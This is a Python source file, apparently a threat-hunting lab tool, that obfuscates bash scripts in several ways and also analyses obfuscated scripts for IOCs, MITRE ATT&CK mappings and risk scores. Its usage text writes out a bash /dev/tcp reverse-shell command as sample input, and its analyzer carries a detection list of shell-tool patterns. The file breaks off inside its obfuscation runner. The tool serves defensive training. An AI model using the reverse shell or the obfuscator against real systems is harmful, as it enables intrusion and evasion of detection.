#!/usr/bin/env python3
"""
Bash Script Obfuscator + Analyzer - Threat Hunting Lab Tool
Author: Jason (Higher Echelon, Inc.)
Target:  GNU bash 5.2.15(1)-release

OBFUSCATE:
  python3 bash_obfuscator.py -f script.sh -t all
  python3 bash_obfuscator.py --inline 'bash -i >& /dev/tcp/10.50.160.3/9150 0>&1' -t b64
  python3 bash_obfuscator.py -f script.sh -t multi --layers 3
  python3 bash_obfuscator.py -f script.sh -t all -o ./samples/

ANALYZE:
  python3 bash_obfuscator.py --analyze -f obfuscated.sh
  python3 bash_obfuscator.py --analyze --inline 'eval $(printf "\\x62\\x61\\x73\\x68")'
  python3 bash_obfuscator.py --analyze -f obfuscated.sh --report
  python3 bash_obfuscator.py --analyze -f obfuscated.sh --report -o ./reports/

OTHER:
  python3 bash_obfuscator.py --list-techniques
"""

import argparse, base64, json, os, re, random, string, sys
from datetime import datetime
from textwrap import dedent

# ─────────────────────────────── SHARED UTILITIES ────────────────────────────

def rand_var(length=None):
    length = length or random.randint(3, 8)
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

def to_hex(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)

def to_b64(s):
    return base64.b64encode(s.encode()).decode()

def split_string_randomly(s, min_parts=2, max_parts=5):
    n = random.randint(min_parts, min(max_parts, max(2, len(s) // 2)))
    indices = sorted(random.sample(range(1, len(s)), min(n - 1, len(s) - 1)))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx]); prev = idx
    parts.append(s[prev:])
    return [p for p in parts if p]

def strip_shebang(script):
    lines = script.strip().splitlines()
    if lines and lines[0].startswith('#!'):
        return lines[0], '\n'.join(lines[1:]).strip()
    return '', script.strip()

def get_payload(script):
    _, body = strip_shebang(script)
    return '\n'.join(l for l in body.splitlines() if l.strip() and not l.strip().startswith('#'))

def print_banner():
    print(dedent("""
    ╔══════════════════════════════════════════════════════════════╗
    ║       Bash Obfuscator + Analyzer — Threat Hunt Lab Tool      ║
    ║            GNU bash 5.2.15(1)-release Compatible             ║
    ╚══════════════════════════════════════════════════════════════╝
    """))

def print_section(title, content, note=None):
    w = 64
    print(f"\n{'═'*w}\n  {title}\n{'═'*w}")
    print(content)
    if note: print(f"\n  [Hunt Target] {note}")

# ──────────────────────────── OBFUSCATION TECHNIQUES ─────────────────────────

def technique_base64(script):
    payload = get_payload(script)
    encoded = to_b64(payload)
    if random.choice([True, False]):
        parts = split_string_randomly(encoded, 2, 4)
        vnames = [rand_var() for _ in parts]
        assigns = '\n'.join(f"{v}='{p}'" for v, p in zip(vnames, parts))
        concat  = ''.join(f'${{{v}}}' for v in vnames)
        body = f"{assigns}\neval \"$(echo {concat} | base64 -d)\""
    else:
        body = f"eval \"$(echo '{encoded}' | base64 -d)\""
    return f"#!/usr/bin/bash\n{body}"

def technique_hex(script):
    payload = get_payload(script)
    hex_str = to_hex(payload)
    if random.choice([True, False]):
        v = rand_var()
        body = f"{v}=$(printf '{hex_str}')\neval \"${{{v}}}\""
    else:
        body = f"eval $(printf '{hex_str}')"
    return f"#!/usr/bin/bash\n{body}"

def technique_vars(script):
    payload = get_payload(script)
    tokens  = payload.split()
    var_map, assigns = {}, []
    for token in tokens:
        parts = split_string_randomly(token, 2, 4)
        pvars = []
        for part in parts:
            v = rand_var(); assigns.append(f"{v}='{part}'"); pvars.append(f'${{{v}}}')
        var_map[token] = ''.join(pvars)
    reconstructed = ' '.join(var_map[t] for t in tokens)
    return f"#!/usr/bin/bash\n{chr(10).join(assigns)}\neval \"{reconstructed}\""

def technique_ansi(script):
    payload = get_payload(script)
    tokens  = payload.split(' ', 1)
    cmd     = tokens[0]; rest = tokens[1] if len(tokens) > 1 else ''
    ansi    = "$'" + to_hex(cmd) + "'"
    body    = f"{ansi} {rest}" if rest else ansi
    return f"#!/usr/bin/bash\n{body}"

def technique_ifs(script):
    payload = get_payload(script)
    tokens  = payload.split()
    cmd     = tokens[0]
    delim   = random.choice(['_', ':', '@', '%'])
    parts   = split_string_randomly(cmd, 2, 3)
    joined  = delim.join(parts)
    vnames  = [rand_var() for _ in parts]
    concat  = ''.join(f'${{{v}}}' for v in vnames)
    rest    = ' '.join(tokens[1:])
    body    = f"IFS={delim} read -r {' '.join(vnames)} <<< '{joined}'\neval \"{concat} {rest}\""
    return f"#!/usr/bin/bash\n{body}"

def technique_heredoc(script):
    payload = get_payload(script)
    encoded = to_b64(payload)
    label   = rand_var(6).upper().lstrip('_')
    return f"#!/usr/bin/bash\nbase64 -d << '{label}' | bash\n{encoded}\n{label}"

def technique_glob(script):
    payload = get_payload(script)
    tokens  = payload.split(' ', 1)
    cmd     = tokens[0]; rest = tokens[1] if len(tokens) > 1 else ''
    if '/' not in cmd:
        glob_cmd = '/' + '??'*3 + '/' + cmd[0] + '?'*(len(cmd)-2) + cmd[-1]
    else:
        glob_cmd = '/'.join(
            '' if not p else
            ''.join('?' if i % 2 == 1 and len(p) > 2 else c for i, c in enumerate(p))
            for p in cmd.split('/')
        )
    body = f"{glob_cmd} {rest}" if rest else glob_cmd
    return f"#!/usr/bin/bash\n# Note: glob expansion requires bash with globbing enabled\n{body}"

def technique_multi_layer(script, layers=2):
    pool   = [technique_vars, technique_base64, technique_hex, technique_ifs]
    chosen = random.sample(pool, min(layers, len(pool)))
    result, log = script, []
    for i, tech in enumerate(chosen):
        result = tech(result)
        log.append(f"  Layer {i+1}: {tech.__name__.replace('technique_','')}")
    return result, log

TECHNIQUES = {
    'b64':   (technique_base64,  "Base64 encode + eval"),
    'hex':   (technique_hex,     "Hex encode via printf + eval"),
    'vars':  (technique_vars,    "Variable substitution + assembly"),
    'ansi':  (technique_ansi,    "ANSI-C quoting ($'\\xNN') on command word"),
    'ifs':   (technique_ifs,     "IFS manipulation + read split"),
    'here':  (technique_heredoc, "Heredoc pipe to bash"),
    'glob':  (technique_glob,    "Glob/wildcard path expansion"),
    'multi': (None,              "Multi-layer chained obfuscation"),
    'all':   (None,              "Run all techniques individually"),
}
DETECTION_NOTES = {
    'b64':  "base64 -d | bash or eval with base64 decode — high signal",
    'hex':  "printf with \\x sequences + eval — uncommon in legit scripts",
    'vars': "Multiple short random vars assembling a command string",
    'ansi': "$'\\x...' syntax in command position — rare outside obfuscation",
    'ifs':  "IFS reassignment followed by command execution",
    'here': "Heredoc with base64 content piped to bash",
    'glob': "Wildcard paths like /???/b?sh — anomalous process image paths",
}

# ───────────────────────────── DEOBFUSCATION ENGINE ──────────────────────────

class DeobfuscationResult:
    def __init__(self):
        self.original         = ''
        self.detected_layers  = []
        self.decoded_steps    = []
        self.final_payload    = ''
        self.iocs             = {}
        self.mitre_techniques = []
        self.risk_score       = 0
        self.risk_label       = ''
        self.warnings         = []

def decode_hex_escapes(s):
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)

def resolve_vars(body):
    store = {}
    for m in re.finditer(r"^([A-Za-z_]\w*)=['\"]([^'\"]*)['\"]", body, re.MULTILINE):
        store[m.group(1)] = m.group(2)
    resolved = body
    for var, val in store.items():
        resolved = resolved.replace(f'${{{var}}}', val)
        resolved = re.sub(rf'\${var}(?=[^A-Za-z0-9_]|$)', val, resolved)
    return resolved, store

def try_b64_decode(s):
    s = s.strip().replace('\n', '')
    pad = 4 - len(s) % 4
    if pad != 4: s += '=' * pad
    try:
        d = base64.b64decode(s).decode('utf-8')
        if d and all(0x08 <= ord(c) < 0x80 or c in '\n\r\t' for c in d):
            return d
    except Exception:
        pass
    return None

def extract_iocs(text):
    iocs = {'ipv4': [], 'ip_port': [], 'domain': [], 'suspicious_commands': [],
            'file_paths': [], 'network_patterns': []}

    for ip in re.findall(r'\b(\d{1,3}(?:\.\d{1,3}){3})\b', text):
        if all(0 <= int(p) <= 255 for p in ip.split('.')) and ip not in iocs['ipv4']:
            iocs['ipv4'].append(ip)

    for m in re.finditer(r'/dev/tcp/(\d{1,3}(?:\.\d{1,3}){3})/(\d+)', text):
        e = f"{m.group(1)}:{m.group(2)}"
        if e not in iocs['ip_port']: iocs['ip_port'].append(e)

    dom_re = re.compile(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+'
                        r'(?:com|net|org|io|gov|edu|co|sh|xyz|me|info)\b')
    for d in dom_re.findall(text):
        if d not in iocs['domain']: iocs['domain'].append(d)

    sus = [
        (r'\bnc\b',                   'nc (netcat)'),
        (r'\bncat\b',                  'ncat'),
        (r'bash\s+-i',                'bash -i (interactive shell)'),
        (r'sh\s+-i',                  'sh -i (interactive shell)'),
        (r'/dev/tcp',                 '/dev/tcp (bash TCP redirect)'),
        (r'/dev/udp',                 '/dev/udp (bash UDP redirect)'),
        (r'curl\s+.*\|\s*(?:bash|sh)','curl pipe to shell'),
        (r'wget\s+.*\|\s*(?:bash|sh)','wget pipe to shell'),
        (r'\bsocat\b',                'socat'),
        (r'\bpython[23]?\s+-c\b',     'python -c (inline exec)'),
        (r'\bperl\s+-e\b',            'perl -e (inline exec)'),
        (r'\bphp\s+-r\b',             'php -r (inline exec)'),
        (r'\bnohup\b',                'nohup (persist after logout)'),
        (r'\bdisown\b',               'disown (detach process)'),
        (r'0>&1',                     '0>&1 stdin redirect'),
        (r'>&\s*/dev',                '>& /dev redirect'),
        (r'\bchmod\s+[0-7]{3,4}',    'chmod (permission change)'),
        (r'\bssh\b.*-R\b',            'ssh -R (remote port forward)'),
    ]
    for pat, label in sus:
        if re.search(pat, text) and label not in iocs['suspicious_commands']:
            iocs['suspicious_commands'].append(label)

    for p in re.findall(r'(?:^|[\s\'"])(/(?:etc|tmp|var|usr|bin|sbin|home|root|dev|proc)[^\s\'"]*)', text):
        if p not in iocs['file_paths']: iocs['file_paths'].append(p)

    for n in re.findall(r'/dev/(?:tcp|udp)/[^\s]+', text):
        if n not in iocs['network_patterns']: iocs['network_patterns'].append(n)

    return {k: v for k, v in iocs.items() if v}

def map_mitre(detected_layers, iocs, text):
    names = set(l['name'] for l in detected_layers)
    mappings = []

    if 'base64' in names or 'heredoc' in names:
        mappings.append({'id':'T1027.001','name':'Obfuscated Files or Information: Binary Padding',
            'sub':'Base64 payload encoding',
            'relevance':'Payload base64-encoded to evade string-match detections'})
    if 'hex' in names or 'ansi_c' in names:
        mappings.append({'id':'T1027','name':'Obfuscated Files or Information',
            'sub':'Hex/ANSI-C escape obfuscation',
            'relevance':'Hex sequences obscure command names and arguments'})
    if 'variable_assembly' in names or 'ifs_manipulation' in names:
        mappings.append({'id':'T1027.008','name':'Obfuscated Files or Information: Stripped Payloads',
            'sub':'String splitting and dynamic assembly',
            'relevance':'Command reconstructed at runtime from fragmented variables'})
    if '/dev/tcp' in text or '/dev/udp' in text or 'ip_port' in iocs:
        mappings.append({'id':'T1059.004','name':'Command and Scripting Interpreter: Unix Shell',
            'sub':'Bash /dev/tcp reverse shell',
            'relevance':'/dev/tcp used for raw TCP-based reverse shell'})
        mappings.append({'id':'T1071.001','name':'Application Layer Protocol: Web Protocols',
            'sub':'C2 over raw TCP',
            'relevance':'Reverse shell establishes outbound C2 channel'})
    if re.search(r'bash\s+-i|sh\s+-i', text):
        mappings.append({'id':'T1059.004','name':'Command and Scripting Interpreter: Unix Shell',
            'sub':'Interactive shell via -i flag',
            'relevance':'bash -i provides interactive TTY to remote operator'})
    if re.search(r'\beval\b', text):
        mappings.append({'id':'T1027.010','name':'Obfuscated Files or Information: Command Obfuscation',
            'sub':'eval-based dynamic execution',
            'relevance':'eval executes dynamically constructed command strings'})

    seen, unique = set(), []
    for m in mappings:
        if m['id'] not in seen:
            seen.add(m['id']); unique.append(m)
    return unique

def score_risk(layers, iocs, mitre):
    score = min(len(layers) * 15, 45)
    if 'ip_port' in iocs or 'network_patterns' in iocs: score += 25
    if 'suspicious_commands' in iocs: score += min(len(iocs['suspicious_commands']) * 5, 20)
    score += min(len(mitre) * 2, 10)
    score = min(score, 100)
    label = 'CRITICAL' if score >= 75 else 'HIGH' if score >= 50 else 'MEDIUM' if score >= 25 else 'LOW'
    return score, label

def analyze_script(text):
    result          = DeobfuscationResult()
    result.original = text
    working         = text
    step_num        = 0

    # Pass 1: Variable assembly
    var_inds = re.findall(r"^[A-Za-z_]\w*=['\"]", working, re.MULTILINE)
    has_eval = bool(re.search(r'eval\s+["\'].*\$\{', working))
    if len(var_inds) >= 2 and has_eval:
        result.detected_layers.append({'name':'variable_assembly','confidence':'HIGH',
            'evidence':f'{len(var_inds)} variable assignments + eval concatenation'})
        resolved, store = resolve_vars(working)
        if store:
            step_num += 1
            result.decoded_steps.append({'step':step_num,'method':'Variable Resolution',
                'detail':f'Resolved {len(store)} var(s): {", ".join(list(store.keys())[:8])}',
                'result':resolved})
            working = resolved

    # Pass 2: ANSI-C $'\xNN'
    ansi_m = re.findall(r"\$'((?:\\x[0-9a-fA-F]{2})+)'", working)
    if ansi_m:
        result.detected_layers.append({'name':'ansi_c','confidence':'HIGH',
            'evidence':f'{len(ansi_m)} ANSI-C quoted sequence(s)'})
        decoded = re.sub(r"\$'((?:\\x[0-9a-fA-F]{2})+)'",
                         lambda m: decode_hex_escapes(m.group(1)), working)
        step_num += 1
        result.decoded_steps.append({'step':step_num,'method':"ANSI-C Quoting Decode ($'\\xNN')",
            'detail':f'Decoded: {[decode_hex_escapes(s) for s in ansi_m[:3]]}','result':decoded})
        working = decoded

    # Pass 3: printf hex
    hex_m = re.search(r"printf\s+'((?:\\x[0-9a-fA-F]{2})+)'", working)
    if hex_m:
        decoded_hex = decode_hex_escapes(hex_m.group(1))
        result.detected_layers.append({'name':'hex','confidence':'HIGH',
            'evidence':f'printf hex sequence ({len(hex_m.group(1))//4} encoded chars)'})
        step_num += 1
        result.decoded_steps.append({'step':step_num,'method':'Hex Decode (printf \\xNN)',
            'detail':f'Raw sequence: {len(hex_m.group(1))} chars','result':decoded_hex})
        working = working.replace(hex_m.group(0), f'"{decoded_hex}"')

    # Pass 4: Base64
    for pat in [re.compile(r"echo\s+'?\"?([A-Za-z0-9+/]{20,}={0,2})'?\"?\s*\|\s*base64\s+-d"),
                re.compile(r"echo\s+([A-Za-z0-9+/]{20,}={0,2})\s*\|\s*base64")]:
        m = pat.search(working)
        if m:
            d = try_b64_decode(m.group(1))
            if d:
                short = m.group(1)[:48] + ('…' if len(m.group(1))>48 else '')
                result.detected_layers.append({'name':'base64','confidence':'HIGH',
                    'evidence':f'Base64 blob ({len(m.group(1))} chars) decoded successfully'})
                step_num += 1
                result.decoded_steps.append({'step':step_num,'method':'Base64 Decode',
                    'detail':f'Encoded: {short}','result':d})
                working = d; break

    # Pass 5: Heredoc + base64
    hd_m = re.search(r"base64\s+-d\s+<<\s+'?(\w+)'?\s*\|.*\n([A-Za-z0-9+/\n]{10,}={0,2})\n\1",
                     working, re.DOTALL)
    if hd_m:
        d = try_b64_decode(hd_m.group(2).strip())
        if d:
            result.detected_layers.append({'name':'heredoc','confidence':'HIGH',
                'evidence':f"Heredoc '{hd_m.group(1)}' with base64 payload piped to bash"})
            step_num += 1
            result.decoded_steps.append({'step':step_num,'method':'Heredoc + Base64 Decode',
                'detail':f"Label: {hd_m.group(1)}, payload: {len(hd_m.group(2))} chars",'result':d})
            working = d

    # Pass 6: IFS manipulation
    ifs_m = re.search(r"IFS=(.)\s+read\s+-r\s+([\w\s]+)<<<\s*['\"]([^'\"]+)['\"]", working)
    if ifs_m:
        delim = ifs_m.group(1); joined = ifs_m.group(3)
        parts = joined.split(delim); recon = ''.join(parts)
        result.detected_layers.append({'name':'ifs_manipulation','confidence':'HIGH',
            'evidence':f"IFS='{delim}', '{joined}' → '{recon}'"})
        step_num += 1
        result.decoded_steps.append({'step':step_num,'method':'IFS Manipulation Decode',
            'detail':f"Delimiter: '{delim}', Parts: {parts}",'result':f"Reassembled: '{recon}'"})

    # Pass 7: Glob
    glob_m = re.search(r'(/(?:[^\s]*\?[^\s]*)+)', working)
    if glob_m:
        result.detected_layers.append({'name':'glob','confidence':'MEDIUM',
            'evidence':f"Wildcard path '{glob_m.group(1)}' — requires runtime resolution"})
        result.warnings.append(f"Glob '{glob_m.group(1)}' cannot be statically resolved. "
                               "Cross-reference process execution logs.")

    # Finalize
    final = re.sub(r'^eval\s+["\']?(.*?)["\']?\s*$', r'\1', working.strip(), flags=re.DOTALL)
    result.final_payload = final.strip().strip('"\'')

    corpus = result.original + '\n' + result.final_payload
    for step in result.decoded_steps: corpus += '\n' + step.get('result','')
    result.iocs             = extract_iocs(corpus)
    result.mitre_techniques = map_mitre(result.detected_layers, result.iocs, corpus)
    result.risk_score, result.risk_label = score_risk(
        result.detected_layers, result.iocs, result.mitre_techniques)

    if not result.detected_layers:
        result.warnings.append("No known obfuscation patterns detected. "
                               "Script may be plaintext or use an unsupported technique.")
    return result

# ──────────────────────────── ANALYSIS RENDERING ─────────────────────────────

RISK_C = {'CRITICAL':'\033[91m','HIGH':'\033[93m','MEDIUM':'\033[94m','LOW':'\033[92m'}
RST, BLD = '\033[0m', '\033[1m'

def render_analysis(result, use_color=True):
    R = RISK_C.get(result.risk_label,'') if use_color else ''
    B = BLD if use_color else ''; X = RST if use_color else ''
    w = 64; lines = []

    lines += [f"\n{'═'*w}", f"  {B}ANALYSIS REPORT{X}",
              f"  Timestamp : {datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')} UTC", f"{'═'*w}"]

    lines.append(f"\n  {B}Risk Score:{X}  {R}{result.risk_score}/100 — {result.risk_label}{X}")
    filled = int(result.risk_score / 5)
    lines.append(f"  [{R}{'█'*filled}{X}{'░'*(20-filled)}]")

    lines.append(f"\n  {B}Obfuscation Layers Detected ({len(result.detected_layers)}):{X}")
    if result.detected_layers:
        for layer in result.detected_layers:
            lines.append(f"    ◆ {layer['name'].replace('_',' ').upper():<25} [{layer['confidence']}]")
            lines.append(f"      {layer['evidence']}")
    else:
        lines.append("    None detected.")

    lines.append(f"\n  {B}Decode Steps:{X}")
    if result.decoded_steps:
        for step in result.decoded_steps:
            lines.append(f"\n    ┌─ Step {step['step']}: {B}{step['method']}{X}")
            lines.append(f"    │  Detail : {step['detail']}")
            preview = step['result'].replace('\n',' ↵ ')
            if len(preview) > 110: preview = preview[:110] + '…'
            lines.append(f"    └─ Result : {R}{preview}{X}")
    else:
        lines.append("    No decode steps performed.")

    lines.append(f"\n  {B}Recovered Payload:{X}")
    if result.final_payload:
        for line in result.final_payload.splitlines():
            lines.append(f"    {R}{line}{X}")
    else:
        lines.append("    (unable to recover — see warnings)")

    lines.append(f"\n  {B}Extracted IOCs:{X}")
    if result.iocs:
        for k, vals in result.iocs.items():
            lines.append(f"    {k.replace('_',' ').upper()}:")
            for v in vals: lines.append(f"      • {v}")
    else:
        lines.append("    None extracted.")

    lines.append(f"\n  {B}MITRE ATT&CK Mappings ({len(result.mitre_techniques)}):{X}")
    if result.mitre_techniques:
        for m in result.mitre_techniques:
            lines += [f"    [{m['id']}] {m['name']}",
                      f"             ↳ {m['sub']}",
                      f"               {m['relevance']}"]
    else:
        lines.append("    No mappings identified.")

    if result.warnings:
        lines.append(f"\n  {B}Warnings:{X}")
        for w in result.warnings: lines.append(f"    ⚠  {w}")

    lines.append(f"\n{'═'*w}\n")
    return '\n'.join(lines)

def render_report_json(result):
    return {'timestamp':datetime.utcnow().isoformat()+'Z',
            'risk_score':result.risk_score,'risk_label':result.risk_label,
            'detected_layers':result.detected_layers,'decode_steps':result.decoded_steps,
            'final_payload':result.final_payload,'iocs':result.iocs,
            'mitre_techniques':result.mitre_techniques,'warnings':result.warnings,
            'original_script':result.original}

# ─────────────────────────────────── BATCH MODE ──────────────────────────────

SUPPORTED_EXTENSIONS = {'.sh', '.bash', '.txt', '.script', ''}  # '' = no extension

def collect_files(path, recursive=False):
    """Collect all candidate shell script files from a directory."""
    files = []
    if recursive:
        for root, _, fnames in os.walk(path):
            for fn in fnames:
                fp = os.path.join(root, fn)
                _, ext = os.path.splitext(fn)
                if ext.lower() in SUPPORTED_EXTENSIONS:
                    files.append(fp)
    else:
        for fn in os.listdir(path):
            fp = os.path.join(path, fn)
            if os.path.isfile(fp):
                _, ext = os.path.splitext(fn)
                if ext.lower() in SUPPORTED_EXTENSIONS:
                    files.append(fp)
    return sorted(files)


def render_batch_summary(batch_results, use_color=True):
    """
    Render a triage table + aggregated IOC/MITRE summary across all files.
    batch_results: list of {'file': path, 'result': DeobfuscationResult, 'error': str|None}
    """
    B = BLD if use_color else ''; X = RST if use_color else ''
    w = 72

    lines = []
    lines += [f"\n{'═'*w}", f"  {B}BATCH ANALYSIS SUMMARY{X}",
              f"  Scanned : {datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')} UTC",
              f"  Files   : {len(batch_results)}", f"{'═'*w}"]

    # ── Triage table ──────────────────────────────────────────────────────────
    lines.append(f"\n  {B}{'FILE':<36} {'RISK':<10} {'SCORE':>5}  {'LAYERS':<6}  PAYLOAD{X}")
    lines.append(f"  {'─'*68}")

    risk_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'ERROR': 4}
    sorted_results = sorted(batch_results,
                            key=lambda r: risk_order.get(r.get('risk_label','ERROR'), 4))

    for item in sorted_results:
        fname   = os.path.basename(item['file'])[:34]
        if item.get('error'):
            lines.append(f"  {fname:<36} {'ERROR':<10} {'N/A':>5}  {'N/A':<6}  {item['error'][:30]}")
            continue
        result  = item['result']
        R       = RISK_C.get(result.risk_label,'') if use_color else ''
        label   = f"{R}{result.risk_label:<10}{X}"
        score   = f"{R}{result.risk_score:>5}{X}"
        nlayers = len(result.detected_layers)
        payload = (result.final_payload or '(none)').replace('\n',' ')
        if len(payload) > 28: payload = payload[:28] + '…'
        lines.append(f"  {fname:<36} {label} {score}  {nlayers:<6}  {payload}")

    # ── Risk distribution ─────────────────────────────────────────────────────
    lines.append(f"\n  {B}Risk Distribution:{X}")
    counts = {'CRITICAL':0,'HIGH':0,'MEDIUM':0,'LOW':0,'ERROR':0}
    for item in batch_results:
        if item.get('error'):
            counts['ERROR'] += 1
        else:
            counts[item['result'].risk_label] = counts.get(item['result'].risk_label, 0) + 1

    total = len(batch_results)
    for label, count in counts.items():
        if count == 0: continue
        R   = RISK_C.get(label,'') if use_color else ''
        pct = int((count / total) * 20)
        bar = f"{'█'*pct}{'░'*(20-pct)}"
        lines.append(f"    {R}{label:<10}{X}  {R}{bar}{X}  {count}/{total}")

    # ── Aggregated IOCs ───────────────────────────────────────────────────────
    agg_iocs = {}
    for item in batch_results:
        if item.get('error'): continue
        for ioc_type, vals in item['result'].iocs.items():
            agg_iocs.setdefault(ioc_type, set()).update(vals)

    lines.append(f"\n  {B}Aggregated IOCs (unique across all files):{X}")
    if agg_iocs:
        for ioc_type, vals in agg_iocs.items():
            lines.append(f"    {ioc_type.replace('_',' ').upper()}:")
            for v in sorted(vals): lines.append(f"      • {v}")
    else:
        lines.append("    None.")

    # ── Aggregated MITRE ──────────────────────────────────────────────────────
    mitre_counts = {}
    for item in batch_results:
        if item.get('error'): continue
        for m in item['result'].mitre_techniques:
            key = f"[{m['id']}] {m['name']}"
            mitre_counts[key] = mitre_counts.get(key, 0) + 1

    lines.append(f"\n  {B}MITRE ATT&CK Technique Frequency:{X}")
    if mitre_counts:
        for tech, cnt in sorted(mitre_counts.items(), key=lambda x: -x[1]):
            bar = '█' * min(cnt, 20)
            lines.append(f"    {bar:<20}  {cnt:>3}x  {tech}")
    else:
        lines.append("    None.")

    # ── Obfuscation layer frequency ───────────────────────────────────────────
    layer_counts = {}
    for item in batch_results:
        if item.get('error'): continue
        for layer in item['result'].detected_layers:
            layer_counts[layer['name']] = layer_counts.get(layer['name'], 0) + 1

    lines.append(f"\n  {B}Obfuscation Technique Frequency:{X}")
    if layer_counts:
        for tech, cnt in sorted(layer_counts.items(), key=lambda x: -x[1]):
            bar = '█' * min(cnt, 20)
            lines.append(f"    {bar:<20}  {cnt:>3}x  {tech.replace('_',' ').upper()}")
    else:
        lines.append("    None.")

    lines.append(f"\n{'═'*w}\n")
    return '\n'.join(lines)


def render_batch_csv(batch_results):
    """Render a flat CSV string for spreadsheet ingestion / SIEM upload."""
    import csv, io
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(['file','risk_label','risk_score','layers_detected','layer_names',
                     'final_payload','ipv4','ip_port','network_patterns',
                     'suspicious_commands','mitre_ids','warnings','error'])
    for item in batch_results:
        fname = item['file']
        if item.get('error'):
            writer.writerow([fname,'ERROR',0,0,'','','','','','','','',item['error']])
            continue
        r = item['result']
        writer.writerow([
            fname,
            r.risk_label,
            r.risk_score,
            len(r.detected_layers),
            '|'.join(l['name'] for l in r.detected_layers),
            r.final_payload.replace('\n',' '),
            '|'.join(r.iocs.get('ipv4',[])),
            '|'.join(r.iocs.get('ip_port',[])),
            '|'.join(r.iocs.get('network_patterns',[])),
            '|'.join(r.iocs.get('suspicious_commands',[])),
            '|'.join(m['id'] for m in r.mitre_techniques),
            '|'.join(r.warnings),
            '',
        ])
    return buf.getvalue()


def run_batch(args):
    """
    Batch analyze mode:
      - Scans a directory (optionally recursive) for .sh / .bash / .txt files
      - Analyzes each one
      - Prints per-file condensed output (unless --quiet)
      - Prints aggregated summary table
      - Optionally saves per-file JSON + batch_summary.json + batch_summary.csv
    """
    use_color = not args.no_color
    B = BLD if use_color else ''; X = RST if use_color else ''
    w = 72

    scan_dir = args.batch
    if not os.path.isdir(scan_dir):
        print(f"[!] --batch path is not a directory: {scan_dir}")
        sys.exit(1)

    files = collect_files(scan_dir, recursive=args.recursive)
    if not files:
        print(f"[!] No supported script files found in: {scan_dir}")
        sys.exit(1)

    print(f"[*] Batch scan: {len(files)} file(s) found in '{scan_dir}'"
          + (" (recursive)" if args.recursive else "") + "\n")

    batch_results = []
    errors = 0

    for i, fpath in enumerate(files, 1):
        fname = os.path.basename(fpath)
        print(f"  [{i:>3}/{len(files)}] {fname:<40}", end='', flush=True)
        try:
            content = open(fpath, 'r', errors='replace').read()
            result  = analyze_script(content)
            R = RISK_C.get(result.risk_label,'') if use_color else ''
            print(f"  {R}{result.risk_label:<10}{X}  score={result.risk_score:>3}  "
                  f"layers={len(result.detected_layers)}")

            batch_results.append({
                'file':       fpath,
                'risk_label': result.risk_label,
                'result':     result,
                'error':      None,
            })

            # Per-file verbose output
            if not args.quiet:
                print(render_analysis(result, use_color=use_color))

            # Per-file JSON report
            if args.report and args.output_dir:
                os.makedirs(args.output_dir, exist_ok=True)
                safe = re.sub(r'[^\w\-.]', '_', fname)
                rpath = os.path.join(args.output_dir, f"analysis_{safe}.json")
                json.dump(render_report_json(result), open(rpath,'w'), indent=2)

        except Exception as e:
            err_msg = str(e)[:60]
            print(f"  ERROR — {err_msg}")
            batch_results.append({'file': fpath, 'risk_label':'ERROR',
                                  'result': None, 'error': err_msg})
            errors += 1

    # ── Summary ───────────────────────────────────────────────────────────────
    print(render_batch_summary(batch_results, use_color=use_color))

    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)
        ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')

        # Batch summary JSON
        summary_data = {
            'timestamp': datetime.utcnow().isoformat()+'Z',
            'scan_directory': os.path.abspath(scan_dir),
            'recursive': args.recursive,
            'total_files': len(files),
            'errors': errors,
            'results': [
                {
                    'file': item['file'],
                    'risk_label': item.get('risk_label','ERROR'),
                    'risk_score': item['result'].risk_score if item['result'] else None,
                    'layers': [l['name'] for l in item['result'].detected_layers] if item['result'] else [],
                    'final_payload': item['result'].final_payload if item['result'] else None,
                    'iocs': item['result'].iocs if item['result'] else {},
                    'mitre': [m['id'] for m in item['result'].mitre_techniques] if item['result'] else [],
                    'error': item.get('error'),
                }
                for item in batch_results
            ]
        }
        sjpath = os.path.join(args.output_dir, f"batch_summary_{ts}.json")
        json.dump(summary_data, open(sjpath,'w'), indent=2)
        print(f"[+] Batch JSON saved : {sjpath}")

        # Batch CSV
        scpath = os.path.join(args.output_dir, f"batch_summary_{ts}.csv")
        open(scpath,'w').write(render_batch_csv(batch_results))
        print(f"[+] Batch CSV saved  : {scpath}\n")


# ──────────────────────────────────── CLI ────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(description='Bash Obfuscator + Analyzer — Threat Hunt Lab',
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('--analyze',    action='store_true', help='Deobfuscate + analyze a single script')
    p.add_argument('--batch',      metavar='DIR',       help='Batch analyze all scripts in a directory')
    p.add_argument('--diff',       nargs=2, metavar=('OLD','NEW'),
                   help='Diff two snapshots: each can be a batch_summary JSON or a directory')
    p.add_argument('--watch',      metavar='DIR',
                   help='Continuously monitor a directory, diffing on every change')
    p.add_argument('--interval',   type=int, default=60,
                   help='(Watch) Seconds between scans (default: 60)')
    p.add_argument('--alert-only', action='store_true',
                   help='(Watch) Only print output when ALERT or WARN is triggered')
    p.add_argument('--recursive',  action='store_true', help='(Batch/Diff/Watch) Recurse into subdirectories')
    p.add_argument('--quiet',      action='store_true', help='(Batch) Summary only; suppress per-file output')
    p.add_argument('--report',     action='store_true', help='Save JSON/CSV report(s)')
    p.add_argument('--no-color',   action='store_true', help='Disable ANSI colors')
    src = p.add_mutually_exclusive_group(required=False)
    src.add_argument('-f','--file',  help='Input bash script file')
    src.add_argument('--inline',     help='Inline bash command/script')
    p.add_argument('-t','--technique', choices=list(TECHNIQUES.keys()), default='all')
    p.add_argument('--layers',  type=int, default=2, help='Layers for multi mode (default: 2)')
    p.add_argument('-o','--output-dir', help='Directory to save output files')
    p.add_argument('--list-techniques', action='store_true')
    p.add_argument('--seed', type=int, help='Random seed for reproducible output')
    return p.parse_args()

def run_obfuscate(args):
    if args.seed is not None: random.seed(args.seed)
